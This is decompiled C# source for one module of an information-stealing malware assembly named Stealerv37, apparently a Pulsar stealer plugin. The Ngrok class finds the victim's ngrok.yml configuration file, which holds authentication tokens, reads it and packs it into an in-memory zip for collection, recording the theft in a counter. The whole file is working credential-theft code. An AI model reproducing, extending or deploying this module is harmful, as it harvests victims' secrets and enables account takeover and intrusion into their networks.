// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.Ngrok
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Applications;

public class Ngrok : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
    if (!File.Exists(path))
      return;
    string entryPath = "Ngrok\\ngrok.yml";
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Ngrok);
    zip.AddFile(entryPath, File.ReadAllBytes(path));
    counterApplications.Files.Add($"{path} => {entryPath}");
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);
  }
}
